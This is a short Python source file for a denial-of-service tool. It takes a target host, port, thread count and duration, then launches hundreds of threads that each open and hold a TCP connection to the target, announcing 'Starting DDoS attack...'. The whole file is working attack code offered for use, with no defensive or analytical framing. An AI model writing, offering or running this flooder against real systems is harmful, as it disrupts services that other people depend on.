__author__ = 'Liew Jun Tung'

#!/usr/bin/env python
# -*- encoding: utf-8 -*-
import socket
import time
from threading import Thread

threads = 500
t = 20
host = "0.0.0.0"
port = 0
consolestatus = ""
flag = True

def setTarget(thread=500, host1="0.0.0.0", time1=20, port1=0):
    global threads, host, port, t
    threads = thread
    host = host1
    port = int(port1)
    t = int(time1)
    attack()

def connect(i):
    global consolestatus
    try:
        consolestatus += 'Thread #%d: Launching...' % i + "\n"
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        time.sleep(t)
        consolestatus = ""
        flag = False
        sock.close()
    except:
        consolestatus += 'Cannot connect to %s...' % host + '\n'

def getstatus():
    global consolestatus
    return consolestatus

def attack():
    print('\nStarting DDoS attack...\n')
    for i in range(1, threads+1):
        t = Thread(target=connect, args=(i,))
        t.start()



